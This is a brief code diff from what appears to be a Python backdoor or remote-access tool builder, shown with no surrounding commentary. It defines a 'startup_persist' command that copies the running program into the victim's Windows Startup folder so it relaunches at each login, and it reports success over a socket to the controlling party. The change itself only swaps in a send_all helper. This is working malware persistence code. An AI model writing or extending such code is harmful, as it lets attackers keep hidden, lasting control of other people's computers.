@@ -12,7 +12,7 @@ def main(option):
         config.functions.append('''
 def startup_persist(filepath):
         copy(filepath, 'C:\\\\Users\\\\' + getuser() + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\' + path.basename(argv[0]))
-        s.sendall('[+]Persistence via startup folder achieved'.encode())''')
+        send_all(s,'[+]Persistence via startup folder achieved')''')
         config.logics.append('''
             elif command == "startup_persist":
                 startup_persist(path.join(getcwd(),path.abspath(argv[0])))''')
